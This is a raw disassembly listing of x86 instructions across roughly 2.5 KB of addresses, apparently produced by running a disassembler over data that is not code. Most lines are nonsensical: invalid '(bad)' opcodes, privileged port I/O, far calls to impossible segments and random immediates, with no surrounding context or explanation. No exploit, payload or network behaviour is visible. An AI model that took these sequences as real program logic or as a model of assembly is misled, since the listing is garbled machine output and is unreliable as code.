  41e5f4:	shr    BYTE PTR [esi+0x2b],cl
  41e5f7:	stos   DWORD PTR es:[edi],eax
  41e5f8:	nop
  41e5f9:	mov    ch,0x7e
  41e5fb:	(bad)  
  41e5fc:	std    
  41e5fd:	lahf   
  41e5fe:	iret   
  41e5ff:	stos   BYTE PTR es:[edi],al
  41e600:	imul   edi,ebp,0xffffffd5
  41e603:	jp     0x41e637
  41e605:	fs push ebx
  41e607:	xchg   ecx,eax
  41e608:	adc    ecx,DWORD PTR [ebp+0x14]
  41e60b:	sbb    bl,ah
  41e60d:	pop    ebp
  41e60e:	sub    DWORD PTR [esi-0x476fca32],edx
  41e614:	leave  
  41e615:	ins    BYTE PTR es:[edi],dx
  41e616:	mov    ah,0xac
  41e618:	push   ebp
  41e619:	dec    eax
  41e61a:	call   FWORD PTR [ecx+0x737012d6]
  41e620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e621:	cdq    
  41e622:	xchg   edi,eax
  41e623:	call   0x61ba:0xe9ee93e7
  41e62a:	inc    edi
  41e62b:	sub    eax,0xc8620ed2
  41e630:	jae    0x41e5b2
  41e632:	jp     0x41e6a2
  41e634:	ret    0xe255
  41e637:	push   DWORD PTR [edx+0x71]
  41e63a:	(bad)
  41e63d:	and    DWORD PTR [edi],0xe5fc6aa8
  41e643:	jg     0x41e607
  41e645:	or     bl,0xf1
  41e648:	add    DWORD PTR [esi-0x5b],0x11
  41e64c:	call   DWORD PTR [edx]
  41e64e:	shl    DWORD PTR [ebp-0x3b1faf55],0xe8
  41e655:	ins    DWORD PTR es:[edi],dx
  41e656:	mov    al,ds:0x1b90cfe7
  41e65b:	xor    ch,BYTE PTR [edi-0x57]
  41e65e:	xor    eax,0xc161acac
  41e663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e664:	jge    0x41e6ac
  41e666:	xchg   edx,eax
  41e667:	nop
  41e668:	adc    dh,BYTE PTR [ebp+0x300ba87f]
  41e66e:	or     al,0xb0
  41e670:	sbb    eax,ebx
  41e672:	out    0xbc,eax
  41e674:	fwait
  41e675:	int3   
  41e676:	xchg   ebx,eax
  41e677:	in     eax,0x0
  41e679:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e67b:	jns    0x41e6d7
  41e67d:	scas   eax,DWORD PTR es:[edi]
  41e67e:	gs inc edx
  41e680:	mov    edx,0x25949e47
  41e686:	out    0x40,eax
  41e688:	jo     0x41e632
  41e68a:	cmc    
  41e68b:	mov    bl,0x61
  41e68d:	call   0x0:0xdf4f15
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    esp,DWORD PTR [edx+0xc60109b]
  41e705:	inc    esp
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x7a000001
  41e70d:	xchg   BYTE PTR [ebp+0x49add095],bh
  41e713:	xchg   esi,eax
  41e714:	xor    ebp,DWORD PTR [esi]
  41e716:	neg    BYTE PTR [eax+0x206f490]
  41e71c:	loope  0x41e71f
  41e71e:	imul   DWORD PTR [ecx-0x532f1a77]
  41e724:	and    bl,dl
  41e726:	push   es
  41e727:	and    DWORD PTR [esi],edi
  41e729:	and    al,0x2b
  41e72b:	mov    WORD PTR [edx+ecx*1+0x7e],fs
  41e72f:	mov    bl,0xb8
  41e731:	mov    al,0x6e
  41e733:	cld    
  41e734:	aas    
  41e735:	dec    ebp
  41e736:	ret    0x9e2f
  41e739:	inc    ebp
  41e73a:	fimul  WORD PTR [ecx+0x7b7e29ae]
  41e740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e741:	shl    BYTE PTR [edi+0x1727082a],0x69
  41e748:	xchg   ebp,eax
  41e749:	cmp    al,0x19
  41e74b:	outs   dx,DWORD PTR ds:[esi]
  41e74c:	aad    0x8
  41e74e:	dec    esi
  41e74f:	inc    ebx
  41e750:	(bad)  
  41e752:	test   al,0xe8
  41e754:	adc    DWORD PTR [esi],esi
  41e756:	xor    eax,0x2312678a
  41e75b:	dec    edi
  41e75c:	cwde   
  41e75d:	fiadd  WORD PTR [ebp+0x4]
  41e760:	mov    al,0x77
  41e762:	fwait
  41e763:	inc    ecx
  41e764:	ffreep st(0)
  41e766:	xor    ebx,edi
  41e768:	fld    DWORD PTR [edx]
  41e76a:	push   eax
  41e76b:	xchg   ecx,eax
  41e76c:	mov    bh,dl
  41e76e:	sub    al,0x8e
  41e770:	cmp    eax,0x5efdc574
  41e775:	and    dh,BYTE PTR [ebx-0x7a25f257]
  41e77b:	jno    0x41e73d
  41e77d:	test   DWORD PTR [ecx-0x6dc50c4e],ebp
  41e783:	cmp    BYTE PTR [ebx+0x42b519d8],0x23
  41e78a:	push   edi
  41e78b:	fiadd  WORD PTR [ebx+eiz*1+0x163d9b8a]
  41e792:	mov    edi,0x11d101c2
  41e797:	or     DWORD PTR [eax],edx
  41e799:	mov    ch,0x61
  41e79b:	jg     0x41e79e
  41e79d:	xchg   ebp,eax
  41e79e:	sti    
  41e79f:	outs   dx,DWORD PTR ds:[esi]
  41e7a0:	jg     0x41e81a
  41e7a2:	ss leave 
  41e7a4:	or     eax,0xaaa7923a
  41e7a9:	cdq    
  41e7aa:	test   al,0xc
  41e7ac:	jg     0x41e76e
  41e7ae:	inc    edi
  41e7af:	fbstp  TBYTE PTR [ebp-0x44]
  41e7b2:	jb     0x41e7a5
  41e7b4:	cmp    eax,0x28891118
  41e7b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ba:	mov    bl,BYTE PTR [ebx]
  41e7bc:	inc    esi
  41e7bd:	retf   
  41e7be:	loop   0x41e7a9
  41e7c0:	lods   al,BYTE PTR ds:[esi]
  41e7c1:	loopne 0x41e76f
  41e7c3:	xor    eax,0xaef1e6fd
  41e7c8:	lds    ecx,FWORD PTR [eax-0xf]
  41e7cb:	push   ecx
  41e7cc:	pop    edx
  41e7cd:	fstp   DWORD PTR [edx]
  41e7cf:	pop    edx
  41e7d0:	stos   BYTE PTR es:[edi],al
  41e7d1:	add    al,0x5f
  41e7d3:	push   ebp
  41e7d4:	sbb    esp,edx
  41e7d6:	loop   0x41e80b
  41e7d8:	ins    BYTE PTR es:[edi],dx
  41e7d9:	jae    0x41e782
  41e7db:	retf   0xee0f
  41e7de:	xchg   edi,eax
  41e7df:	jmp    0x41e78f
  41e7e1:	xchg   esi,eax
  41e7e2:	and    al,0x5e
  41e7e4:	pop    edx
  41e7e5:	mov    edx,0x2248ff05
  41e7ea:	cmp    dl,BYTE PTR [edx+eax*1+0x2968408b]
  41e7f1:	dec    ecx
  41e7f2:	cmc    
  41e7f3:	adc    DWORD PTR [ebx],0x1b
  41e7f6:	in     al,0xc9
  41e7f8:	inc    ebp
  41e7f9:	and    esp,DWORD PTR [edi-0x56e68f8c]
  41e7ff:	into   
  41e800:	cwde   
  41e801:	mov    ebp,0xee6933f8
  41e806:	cmp    BYTE PTR [ecx+0x289c6c19],dl
  41e80c:	addr16 ret 
  41e80e:	stc    
  41e80f:	data16 add BYTE PTR [bx+si],al
	...
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e833
  41e881:	mov    esi,0x45113bb8
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    eax,0x67000001
  41e88d:	xor    al,0xef
  41e88f:	aad    0xd1
  41e891:	es jb  0x41e8fe
  41e894:	clc    
  41e895:	cmp    ebp,0x182a321d
  41e89b:	cmc    
  41e89c:	mov    ds:0x2d4d98f8,eax
  41e8a1:	jne    0x41e896
  41e8a3:	inc    edi
  41e8a4:	inc    ebp
  41e8a5:	pop    ebx
  41e8a6:	dec    esi
  41e8a7:	adc    DWORD PTR [edi+0x36],ebx
  41e8aa:	add    DWORD PTR [edi+ebx*4+0x5777f698],ebx
  41e8b1:	fidivr WORD PTR [esi-0x63]
  41e8b4:	imul   esp,DWORD PTR [ecx+0x57],0xa4ad8480
  41e8bb:	pop    es
  41e8bc:	mov    dl,0x76
  41e8be:	and    ebp,DWORD PTR [ebx]
  41e8c0:	je     0x41e872
  41e8c2:	out    0x90,al
  41e8c4:	jo     0x41e93f
  41e8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8c7:	cmovne ebp,DWORD PTR [esi-0x1d6865fb]
  41e8ce:	ja     0x41e8ab
  41e8d0:	sub    DWORD PTR [edi-0x5dbd6509],ecx
  41e8d6:	mov    ah,0xa6
  41e8d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8d9:	mov    esp,0xe2a0c0ed
  41e8de:	in     eax,dx
  41e8df:	repnz mov ch,0x74
  41e8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8e3:	mov    ch,0x99
  41e8e5:	icebp  
  41e8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e7:	js     0x41e878
  41e8e9:	icebp  
  41e8ea:	mov    esp,DWORD PTR [eax+0x48]
  41e8ed:	mov    al,0x89
  41e8ef:	mov    dh,0xc1
  41e8f1:	mov    eax,ds:0x59d1fa9a
  41e8f6:	outs   dx,BYTE PTR ds:[esi]
  41e8f7:	dec    esi
  41e8f8:	or     eax,0x4d5ae516
  41e8fd:	mov    dh,BYTE PTR [esi+0x1a]
  41e900:	pop    ecx
  41e901:	fs jmp 0xcee48738
  41e907:	sar    DWORD PTR [esi+0x282915af],cl
  41e90d:	ins    BYTE PTR es:[edi],dx
  41e90e:	fist   WORD PTR [ebx+ecx*8]
  41e911:	mov    eax,0x8968a4b0
  41e916:	or     al,0x4c
  41e918:	ret    0xa41e
  41e91b:	cmp    DWORD PTR [esi+0x712bd96b],eax
  41e921:	xchg   ebp,eax
  41e922:	dec    edi
  41e923:	or     al,dh
  41e925:	cmp    edi,0x779e1885
  41e92b:	push   DWORD PTR [edi+edi*8+0x38]
  41e92f:	push   ebx
  41e930:	repz dec ebx
  41e932:	xor    al,0x15
  41e934:	ret    
  41e935:	test   ebx,ebx
  41e937:	mov    cl,0x13
  41e939:	test   eax,0xabf6c865
  41e93e:	(bad)  [ebx]
  41e940:	jp     0x41e99b
  41e942:	inc    bp
  41e944:	popa   
  41e945:	mov    ds:0x9d95c8d4,eax
  41e94a:	adc    esi,DWORD PTR [ecx]
  41e94c:	mov    edx,0x5966f581
  41e951:	push   esi
  41e952:	addr16 int3 
  41e954:	jge    0x41e8df
  41e956:	xchg   ecx,eax
  41e957:	sub    al,0xab
  41e959:	mov    cl,0x4b
  41e95b:	lock or eax,0xacc19009
  41e961:	das    
  41e962:	inc    eax
  41e963:	in     eax,dx
  41e964:	xchg   ebp,eax
  41e965:	or     eax,0x7c8658b3
  41e96a:	push   ebx
  41e96b:	pop    edx
  41e96c:	jmp    0x41e913
  41e96e:	or     dh,BYTE PTR [edi-0x56918872]
  41e974:	ins    BYTE PTR es:[edi],dx
  41e975:	or     DWORD PTR [ecx+ebx*8+0x5049de9a],0x56836a1d
  41e980:	push   ds
  41e981:	test   BYTE PTR [eax+esi*4-0x4872597d],dl
  41e988:	inc    edx
  41e989:	sub    al,0xa4
  41e98b:	imul   ecx,DWORD PTR [edi],0x320c2144
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	lods   al,BYTE PTR ds:[esi]
  41ea01:	retf   0x868f
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0xb1000001
  41ea0d:	repnz xor DWORD PTR [ebx+0x47bcb416],ebx
  41ea14:	imul   BYTE PTR [edi]
  41ea16:	test   BYTE PTR [edi],dh
  41ea18:	test   BYTE PTR ds:0xb97fd2f2,bl
  41ea1e:	xchg   ebp,eax
  41ea1f:	rcl    DWORD PTR [eax+ebx*4+0x7c],0x8a
  41ea24:	cmp    al,0x14
  41ea26:	das    
  41ea27:	xchg   ebx,eax
  41ea28:	inc    ecx
  41ea29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea2a:	test   eax,0xca0327e6
  41ea2f:	xor    bh,BYTE PTR ds:0x2cc84b72
  41ea35:	xchg   esp,eax
  41ea36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea37:	(bad)  
  41ea38:	cmp    eax,0xcc2de232
  41ea3d:	xchg   BYTE PTR ds:0x17fbf0aa,cl
  41ea43:	mov    ecx,0xaa8cb439
  41ea48:	popa   
  41ea49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea4a:	mov    dh,cl
  41ea4c:	into   
  41ea4d:	lock jo 0x41ea3d
  41ea50:	out    dx,eax
  41ea51:	jbe    0x41ead1
  41ea53:	jl     0x41e9e0
  41ea55:	ret    
  41ea56:	scas   al,BYTE PTR es:[edi]
  41ea57:	dec    ecx
  41ea58:	fdivr  QWORD PTR [ecx+0x325fdc3b]
  41ea5e:	fisubr WORD PTR [ebx-0x3ef586f]
  41ea64:	xor    bh,cl
  41ea66:	sub    eax,0x6539628a
  41ea6b:	mov    dl,dh
  41ea6d:	in     al,0x4d
  41ea6f:	xchg   esp,eax
  41ea70:	(bad)  
  41ea71:	jnp    0x41eae9
  41ea73:	xchg   BYTE PTR [edx],ch
  41ea75:	ror    DWORD PTR [esi],cl
  41ea77:	sbb    BYTE PTR [esp+eiz*2+0x56a58af0],0x1
  41ea7f:	mov    ebx,0xea251422
  41ea84:	into   
  41ea85:	xor    al,0x27
  41ea87:	dec    edi
  41ea88:	stos   DWORD PTR es:[edi],eax
  41ea89:	or     al,0xf1
  41ea8b:	xchg   edx,eax
  41ea8c:	and    ebp,esp
  41ea8e:	sub    al,0xae
  41ea90:	jmp    0x41ea3f
  41ea92:	or     al,0x18
  41ea94:	inc    edi
  41ea95:	fisttp WORD PTR [eax]
  41ea97:	mov    eax,ds:0x7bb0c67
  41ea9c:	fucomip st,st(6)
  41ea9e:	jb     0x41eb0a
  41eaa0:	add    DWORD PTR [ebp-0x1b],edx
  41eaa3:	xor    eax,0x61b04ff2
  41eaa8:	mov    esp,0x3dd1a34e
  41eaad:	mov    esi,DWORD PTR [esi+0x47f9fd2c]
  41eab3:	call   0x4ea4:0xaf13465a
  41eaba:	loope  0x41eadb
  41eabc:	mov    ds:0xd1251402,eax
  41eac1:	xor    dl,BYTE PTR [edx+0x40b82eea]
  41eac7:	sub    DWORD PTR [ecx*1+0xb03db14],edi
  41eace:	(bad)  
  41eacf:	lea    ecx,[ebx-0x3b]
  41ead2:	xchg   ebp,eax
  41ead3:	jp     0x41ea60
  41ead5:	mov    dl,0xf6
  41ead7:	sub    eax,0xe6897c6c
  41eadc:	jg     0x41eab2
  41eade:	adc    ebx,ebp
  41eae0:	sub    ah,BYTE PTR [ebp+0x6b]
  41eae3:	out    0x55,al
  41eae5:	lahf   
  41eae6:	shr    ah,1
  41eae8:	xchg   DWORD PTR [edi],esp
  41eaea:	jne    0x41ead9
  41eaec:	push   ecx
  41eaed:	jb     0x41eaa8
  41eaef:	inc    ecx
  41eaf0:	jle    0x41ea84
  41eaf2:	xor    cl,BYTE PTR [ebp+0x3a]
  41eaf5:	dec    ebp
  41eaf6:	cmp    DWORD PTR [ecx+0x16f0c7e],edx
  41eafc:	aaa    
  41eafd:	add    BYTE PTR [edx],ah
  41eaff:	inc    ebx
  41eb00:	scas   eax,DWORD PTR es:[edi]
  41eb01:	xor    DWORD PTR [ebp+esi*8+0x7c],0xffffffe2
  41eb06:	in     al,0x99
  41eb08:	retf   0x93bc
  41eb0b:	inc    esi
  41eb0c:	fwait
  41eb0d:	mov    edx,0x6d2f68
	...
  41eb72:	add    BYTE PTR [eax],al
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x2b
  41eb81:	inc    eax
  41eb82:	jge    0x41ebb3
  41eb84:	sbb    eax,DWORD PTR [edi+0x1]
  41eb87:	add    BYTE PTR ds:0x55000001,al
  41eb8d:	inc    BYTE PTR [eax]
  41eb8f:	xor    DWORD PTR [ebx-0x56],0xa395bd47
  41eb96:	ins    BYTE PTR es:[edi],dx
  41eb97:	fidiv  WORD PTR [eax+0x46]
  41eb9a:	ror    BYTE PTR [eax+0x55023f44],cl
  41eba0:	sub    ebp,ebx
  41eba2:	cmp    al,0xf5
  41eba4:	pop    edi
  41eba5:	add    eax,ebx
  41eba7:	sahf   
  41eba8:	sti    
  41eba9:	push   cs
  41ebaa:	mov    dl,BYTE PTR [edx+0x2]
  41ebad:	(bad)  
  41ebae:	push   ebx
  41ebaf:	mov    eax,0xba304ac4
  41ebb4:	xchg   esp,eax
  41ebb5:	cmp    eax,DWORD PTR [edi]
  41ebb7:	fld    TBYTE PTR [ebp-0x2a]
  41ebba:	cmp    al,0x50
  41ebbc:	xchg   ecx,eax
  41ebbd:	pop    es
  41ebbe:	mov    BYTE PTR [edi-0x18c5b4d2],ch
  41ebc4:	cmp    dl,BYTE PTR [esi+0x45]
  41ebc7:	test   eax,0x8b1d68fa
  41ebcd:	ins    BYTE PTR es:[edi],dx
  41ebce:	mov    al,ds:0x677ef075
  41ebd3:	das    
  41ebd4:	fiadd  DWORD PTR [esi+0x7d]
  41ebd7:	loopne 0x41ec46
  41ebd9:	mov    ebp,edx
  41ebdb:	sbb    eax,0xdcc17cd3
  41ebe0:	(bad)  
  41ebe1:	fisttp DWORD PTR [eax]
  41ebe3:	cdq    
  41ebe4:	repnz (bad)
  41ebe7:	(bad)  
  41ebe8:	div    DWORD PTR [ebx-0x56]
  41ebeb:	mov    esi,0xb3654cf8
  41ebf0:	mov    edi,0xfa105b21
  41ebf5:	sbb    BYTE PTR [esi+0x7c5aa9a1],dl
  41ebfb:	lahf   
  41ebfc:	(bad)  [ecx+eax*4-0x24]
  41ec00:	push   esp
  41ec01:	das    
  41ec02:	dec    edx
  41ec03:	and    BYTE PTR [esi+0x22b44c7a],0x52
  41ec0a:	aaa    
  41ec0b:	mov    eax,0xa407ed91
  41ec10:	scas   eax,DWORD PTR es:[edi]
  41ec11:	push   esp
  41ec12:	pusha  
  41ec13:	xchg   esi,edi
  41ec15:	sub    cl,0xb5
  41ec18:	lds    edi,FWORD PTR [esi-0x32]
  41ec1b:	cmp    dl,bh
  41ec1d:	dec    edi
  41ec1e:	adc    ch,BYTE PTR [eax+0x5a]
  41ec21:	push   edx
  41ec22:	xor    BYTE PTR [esi],dl
  41ec24:	adc    al,ah
  41ec26:	fwait
  41ec27:	ret    
  41ec28:	push   eax
  41ec29:	xor    ah,BYTE PTR [edi-0x7f]
  41ec2c:	outs   dx,BYTE PTR ds:[esi]
  41ec2d:	or     BYTE PTR [esi],dh
  41ec2f:	dec    ebx
  41ec30:	mov    edx,0x7aec7cbd
  41ec35:	and    al,0x23
  41ec37:	sti    
  41ec38:	adc    BYTE PTR [esi],0x77
  41ec3b:	xchg   ecx,eax
  41ec3c:	and    DWORD PTR [si],edx
  41ec3f:	(bad)  
  41ec40:	into   
  41ec41:	ficomp WORD PTR [edi-0x229bde86]
  41ec47:	fistp  DWORD PTR [ecx+0x7a]
  41ec4a:	dec    edx
  41ec4b:	push   0x60
  41ec4d:	ds xor cl,dl
  41ec50:	fsubr  QWORD PTR ds:0xd8c790e6
  41ec56:	adc    al,0xd7
  41ec58:	push   0x21
  41ec5a:	push   ecx
  41ec5b:	call   0xc216b1ec
  41ec60:	sub    al,0x50
  41ec62:	cmp    cl,ah
  41ec64:	push   ss
  41ec65:	xor    edi,DWORD PTR ds:0xd47f371
  41ec6b:	pop    edi
  41ec6c:	xchg   esp,esi
  41ec6e:	aas    
  41ec6f:	ret    
  41ec70:	xchg   esi,eax
  41ec71:	lock mov ch,dh
  41ec74:	clc    
  41ec75:	test   al,0x1a
  41ec77:	ficom  DWORD PTR [ebx+0x2e]
  41ec7a:	jge    0x41ec1a
  41ec7c:	xchg   ebx,eax
  41ec7d:	push   ebp
  41ec7e:	dec    esp
  41ec7f:	jl     0x41ec31
  41ec81:	in     eax,0x8e
  41ec83:	lods   eax,DWORD PTR ds:[esi]
  41ec84:	rol    BYTE PTR [edx+0x62],1
  41ec87:	dec    edx
  41ec88:	mov    ebx,0x265fa76e
  41ec8d:	xchg   ebx,eax
  41ec8e:	cmc    
  41ec8f:	js     0x41ec28
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x4df85fd0
  41ed02:	popa   
  41ed03:	aam    0x20
  41ed05:	dec    eax
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    eax,0xb1000001
  41ed0d:	test   BYTE PTR [edx],0x1a
  41ed10:	adc    dl,dl
  41ed12:	inc    ebx
  41ed13:	shl    ebp,1
  41ed15:	jne    0x41ed75
  41ed17:	scas   eax,DWORD PTR es:[edi]
  41ed18:	push   ebp
  41ed19:	sbb    DWORD PTR [ebx+eiz*2+0x532fc1e],ecx
  41ed20:	pop    edx
  41ed21:	lods   eax,DWORD PTR ds:[esi]
  41ed22:	adc    al,0xf7
  41ed24:	pop    edx
  41ed25:	stc    
  41ed26:	rcl    DWORD PTR [esi+edi*2],0x21
  41ed2a:	jge    0x41ecb2
  41ed2c:	cmc    
  41ed2d:	jns    0x41ed0d
  41ed2f:	ins    BYTE PTR es:[edi],dx
  41ed30:	xchg   edx,eax
  41ed31:	jle    0x41ed33
  41ed33:	pop    esi
  41ed34:	out    0xbd,eax
  41ed36:	mov    DWORD PTR [ecx+edx*8],ecx
  41ed39:	jns    0x41eda4
  41ed3b:	mov    eax,0xb0ab8f0
  41ed40:	scas   al,BYTE PTR es:[edi]
  41ed41:	ds retf 
  41ed43:	out    0xe7,eax
  41ed45:	in     al,dx
  41ed46:	sti    
  41ed47:	add    edi,DWORD PTR [edx+esi*8+0x44]
  41ed4b:	add    ah,dh
  41ed4d:	clc    
  41ed4e:	imul   ebx,DWORD PTR [eax-0x49c1be6],0x5c5f3dc5
  41ed58:	inc    edx
  41ed59:	and    eax,0x48a71c59
  41ed5e:	pop    ebp
  41ed5f:	adc    eax,0xbd2c3f6f
  41ed64:	mov    bh,0xed
  41ed66:	stos   BYTE PTR es:[edi],al
  41ed67:	xor    al,0xb1
  41ed69:	imul   DWORD PTR [edi+0x14d52f31]
  41ed6f:	fs pusha 
  41ed71:	push   0xdf0f6898
  41ed76:	fwait
  41ed77:	mov    edx,0x4bf20570
  41ed7c:	inc    edi
  41ed7d:	inc    edi
  41ed7e:	jmp    0x9614:0x27655fc7
  41ed85:	mov    dh,0x6e
  41ed87:	push   eax
  41ed88:	push   esp
  41ed89:	xchg   edx,eax
  41ed8a:	(bad)  
  41ed8b:	fidivr DWORD PTR [ebp+0x71]
  41ed8e:	jnp    0x41edcc
  41ed90:	call   0xb746:0xf234383e
  41ed97:	dec    esi
  41ed98:	aaa    
  41ed99:	into   
  41ed9a:	push   0xfffffff8
  41ed9c:	inc    esi
  41ed9d:	les    esi,FWORD PTR [edx-0x65efaacc]
  41eda3:	jl     0x41ed74
  41eda5:	ror    BYTE PTR es:[eax+0x65],1
  41eda9:	jne    0x41edbb
  41edab:	mov    edx,0x2f2cddb9
  41edb0:	ja     0x41edce
  41edb2:	mov    eax,0xced65c80
  41edb7:	jmp    0x41ede7
  41edb9:	mov    esi,0x7e593af5
  41edbe:	scas   al,BYTE PTR es:[edi]
  41edbf:	mov    edi,0x4d92cd1a
  41edc4:	push   ebp
  41edc5:	jmp    0x3d4f63e4
  41edca:	inc    eax
  41edcb:	aaa    
  41edcc:	ret    
  41edcd:	xor    eax,0x5ae3dfc
  41edd3:	jbe    0x41edeb
  41edd5:	mov    edx,0xf6ac07ef
  41edda:	ret    0xb61
  41eddd:	inc    DWORD PTR [ecx]
  41eddf:	fisttp DWORD PTR [ebp-0x3f28f18]
  41ede5:	adc    edi,DWORD PTR [eax-0x12b4ff5]
  41edeb:	sub    BYTE PTR [edi],bl
  41eded:	and    al,0xc1
  41edef:	aad    0xd5
  41edf1:	push   cs
  41edf2:	or     al,0x47
  41edf4:	mov    esi,0x6250e02c
  41edf9:	mov    eax,ds:0x28a1eb35
  41edfe:	pop    esi
  41edff:	sbb    al,0xb5
  41ee01:	pop    ebx
  41ee02:	sbb    al,0xaa
  41ee04:	mov    ds:0x8ad9e803,eax
  41ee09:	in     al,0x1d
  41ee0b:	(bad)  
  41ee0c:	mov    bh,0xb7
  41ee0e:	jmp    edx
  41ee10:	sub    eax,DWORD PTR [eax]
	...
  41ee72:	add    BYTE PTR [eax],al
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25aa:0x74b0c4e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0xe000001
  41ee8d:	xchg   ebx,eax
  41ee8e:	loope  0x41ee48
  41ee90:	fild   WORD PTR [edx+0xa49b597]
  41ee96:	or     BYTE PTR [ebx],bl
  41ee98:	or     BYTE PTR [ecx-0xd],dl
  41ee9b:	xor    bl,BYTE PTR [esp+edi*8]
  41ee9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee9f:	adc    ebx,DWORD PTR [edi+0x7a635fb1]
  41eea5:	jae    0x41eee9
  41eea7:	adc    eax,0x3b4a831f
  41eeac:	add    DWORD PTR fs:[edi-0x47],edi
  41eeb0:	enter  0x632d,0x26
  41eeb4:	into   
  41eeb5:	pop    esp
  41eeb6:	(bad)  
  41eeb7:	ds popf 
  41eeb9:	add    dh,BYTE PTR [ecx+0x54b6c22f]
  41eebf:	mov    esp,0x97fd69c4
  41eec4:	adc    BYTE PTR [ecx],bh
  41eec6:	loop   0x41ef0d
  41eec8:	add    bh,BYTE PTR [ecx-0x41ddd50f]
  41eece:	adc    eax,0x4003cd44
  41eed3:	lock jecxz 0x41ee81
  41eed6:	mov    esi,0x1847d932
  41eedb:	sbb    ah,BYTE PTR [eax-0x4055955e]
  41eee1:	add    eax,0xd33b12bb
  41eee6:	mov    dx,0x6dd3
  41eeea:	in     al,dx
  41eeeb:	cmp    esp,DWORD PTR [esi-0xe869019]
  41eef1:	jnp    0x41ef1e
  41eef3:	sub    ch,BYTE PTR [eax]
  41eef5:	loope  0x41ef3f
  41eef7:	sbb    al,0x62
  41eef9:	ins    DWORD PTR es:[edi],dx
  41eefa:	add    eax,0x17fbcff0
  41eeff:	mov    dh,0xca
  41ef01:	jl     0x41ef2e
  41ef03:	sbb    eax,0xab12a2e
  41ef08:	sbb    al,0x6
  41ef0a:	jp     0x41ef11
  41ef0c:	out    dx,eax
  41ef0d:	pop    esp
  41ef0e:	cmp    dl,BYTE PTR [ebx+0x3f363dc0]
  41ef14:	div    ebp
  41ef16:	mov    edi,ecx
  41ef18:	and    al,BYTE PTR [eax]
  41ef1a:	mov    al,0xa0
  41ef1c:	or     BYTE PTR [ecx],ah
  41ef1e:	clc    
  41ef1f:	sti    
  41ef20:	mov    edi,0x9c08cd89
  41ef25:	or     al,0x16
  41ef27:	dec    ebp
  41ef28:	fsubr  st,st(4)
  41ef2a:	xor    dh,BYTE PTR [edi]
  41ef2c:	add    al,0xa4
  41ef2e:	or     al,0x5
  41ef30:	sti    
  41ef31:	cmp    al,0x42
  41ef33:	mov    bl,0x2d
  41ef35:	pushf  
  41ef36:	dec    esp
  41ef37:	aam    0xb0
  41ef39:	fwait
  41ef3a:	stc    
  41ef3b:	mov    WORD PTR [edi],ds
  41ef3d:	or     BYTE PTR [ebp+edi*4+0x57dde0bf],cl
  41ef44:	lock popa 
  41ef46:	cli    
  41ef47:	push   ecx
  41ef48:	test   DWORD PTR [ecx],0xe105972e
  41ef4e:	dec    ebp
  41ef4f:	pusha  
  41ef50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef52:	js     0x41ef5a
  41ef54:	loop   0x41efc4
  41ef56:	rol    ah,0x42
  41ef59:	pop    ecx
  41ef5a:	std    
  41ef5b:	ret    0xf89c
  41ef5e:	and    bh,cl
  41ef60:	enter  0x4636,0xe1
  41ef64:	test   eax,0x6451baca
  41ef69:	aas    
  41ef6a:	arpl   WORD PTR [ebx+0x24],ax
  41ef6d:	das    
  41ef6e:	or     BYTE PTR [esi+0x4315f9c2],ah
  41ef74:	push   0xffffffba
  41ef76:	stos   DWORD PTR es:[edi],eax
  41ef77:	retf   
  41ef78:	inc    eax
  41ef79:	xchg   BYTE PTR [ebp+0x62ea8055],al
  41ef7f:	cmc    
  41ef80:	fistp  WORD PTR [ebp+0x44]
  41ef83:	jns    0x41ef0d
  41ef85:	mov    eax,ds:0x36699b86
  41ef8a:	push   esi
  41ef8b:	mov    ecx,0x1911ce22
  41ef90:	adc    al,BYTE PTR [eax]
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul eax,DWORD PTR [ecx+0x2add84a9],0x4a
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0x1c000001
  41f00d:	fwait
  41f00e:	mov    bh,0x89
